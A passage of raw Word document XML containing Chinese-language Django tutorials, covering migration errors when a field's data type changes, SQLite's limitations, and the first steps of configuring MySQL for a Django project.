        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>  result = self._query(query)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B72AA6" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>C:\Users\MissEnka\PycharmProjects\django-account\venv\lib\site-packages\pymysql\cursors.py:170: Warning: (1366, "Incorrect integer value: 'Facebook' for column 'company_id' at row 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360F5F49" w14:textId="38A48586" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")result = self._query(query)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ECDFBC" w14:textId="25B7084B" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>为什么？我们数据表里还有数据啊，John之前的company对应数据是字符串(Baidu), 而新对应的字段是整数(company_id)，你把字符串存在整数格式的字段里能不出问题吗? 当您对一个模型进行增减一个字段或改变一个字段的数据类型时，你一定要考虑数据表已经存在的数据与新数据类型不匹配的问题。当已存在的数据不符合新的数据类型要求时，我们必需要把那些不符合要求的数据先删除掉或替换掉，才能更改数据表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16816C27" w14:textId="5F232388" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于这个问题，有两种解决方案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1EC398" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>做法1 暴力做法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA4C853" w14:textId="2733F83D" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用python manage.py flush命令清空所有数据表中的数据，然后再删除migrations文件夹里所有py文件(除了__init__.py)。我们的模型一下回到原点，变成全新模型了，自然不会有问题啦。缺点是所有已有数据都丢失了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA61EF2" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>做法2 推荐做法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5521A5" w14:textId="2FDB8B57" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>先删除migrations文件夹里所有py文件(除了__init__.py)，再运行运行python manage.py migrate。这时仅不符合新数据要求的company字段数据（比如Baidu)丢失，John和Max对象还在。如果数据表中已存在的数据还有价值，建议先对数据库被备份再执行migrate命令迁移。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF8A8FC" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F73C55" w14:textId="6C7AC63A" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文总结了Django更改模型过程中易出现的3种问题及解决方案，是不是很实用?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD254C8" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206BF00A" w14:textId="258A2BF3" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2019.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2690BC9C" w14:textId="25D37BE9" w:rsidR="001C47AF" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>103</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId348" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>2019新年第一篇: SQLite的优缺点及Django配置MySQL数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34374810" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2019新年第一篇: SQLite的优缺点及Django配置MySQL数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D44AA7" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId349" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2019-01-03</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7047264E" w14:textId="21205438" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>休息了一个月，小编我又回来了。在这个月里我也一直在思考这个公众号的未来，到底是为迎合大众做高频率更新，还是迎合自己，业余时间不定期写些Python和Django Web开发的原创技术总结。因为前者会对工作和家人时间形成巨大的占用，小编最终选择了后者，至少可以让这个公众号持续下去。希望得到大家继续支持啊。言归正传，今天小编我就带你看下为什么哪些Django项目中不建议使用自带的SQLite数据库及如何配置使用MySQL数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74957B63" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SQLite的应用场景及优缺点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410C49C3" w14:textId="3105AE9F" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SQLite是一个轻量级的开源免费的数据库。它是一种嵌入式数据库，只是一个.db格式的文件，无需安装，配置和启动。SQLite试图为单独的应用程序和设备提供本地的数据存储。SQLite常见应用场景包括中小型网站，嵌入式设备和应用软件(如android)，文件档案管理和桌面程序(exe)文件数据库。SQLite支持多种编程语言(如python)和操作系统(windows, iOS, unix, linux)，移植性非常好。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F76A58B" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SQLite不适用以下场景</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B987F5" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>客户端/服务器程序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A1A043" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 如果你有许多的客户端程序要通过网络访问一个共享的数据库, 你应当考虑用一个客户端/服务器数据库来替代SQLite。 SQLite可以通过网络文件系统工作, 但是因为和大多数网络文件系统都存在延时, 因此执行效率很差。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588E1782" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>高流量网站</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E28C904" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SQLite通常情况下用作一个中小型网站(日访问次数少于10万)的后台数据库是完全可以胜任的，请不用担心。 但是如果你的网站的访问量大到你开始考虑采取分布式的数据库部署, 那么你应当毫不犹豫的考虑用一个企业级的客户端/服务器数据库来替代SQLite。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB482C8" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>超大的数据集</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710A14CF" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你在SQLite中开始一个事务处理的时候, 数据库引擎将不得不分配一小块内存(文件缓冲页面)来帮助它自己管理回滚操作。每1MB的数据库文件SQLite需要256字节。对于小型的数据库这些空间不算什么, 但是当数据库增长到数十亿字节的时候, 缓冲页面的尺寸就会相当的大了. 如果你需要存储或修改几十GB的数据, 你应该考虑用其他的数据库引擎。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACD4774" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>高并发访问</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E95876" w14:textId="33FC1D13" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SQLite对于整个数据库文件进行读取/写入锁定， 这意味着如果任何进程读取了数据库中的某一部分, 其他所有进程都不能再对该数据库的任何部分进行写入操作。 同样的, 如果任何一个进程在对数据库进行写入操作, 其他所有进程都不能再读取该数据库的任何部分。对于大多数情况这不算是什么问题， 在这些情况下每个程序使用数据库的时间都很短暂, 并且不会独占, 这样锁定至多会存在十几毫秒。但是如果有些程序需要高并发, 那么这些程序就需要寻找其他的解决方案了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F3673A" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>为什么使用MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7690994F" w14:textId="320CE6B9" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你需要开发一个高流量或高并发的网站，SQLite将不能满足你的需求。同时，如果你要开发一个Web APP, 不同用户通过网络对数据库进行读写操作，那么SQLite也将不能胜任（比如分布式数据库)。这时我们需要考虑企业级的专业数据库了，比如MySQL。MySQL是最流行的开源免费的关系型数据库，可作为客户端/服务器数据库提供企业级的数据库服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245661F0" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django项目中如何配置使用MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65228C87" w14:textId="102AE0AE" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于Django新手，你刚开始可以不使用MySQL数据库，但一定要学会如何配置使用MySQL。Django项目中配置使用MySQL一共分四步: 安装MySQL, 创建数据库名和用户名，通过pip安装第三方库pymysql和修改配置文件settings.py。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7975F7EC" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第一步 按装MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB5139E" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Windows用户可以直接从MySQL网站上下载相应版本安装。Linux用户可以使用如下命令安装mysql-server。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F6F313" w14:textId="47F22F19" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> apt-get install mysql-server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D7F9E4" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第二步 创建数据库名和用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9A7F70" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
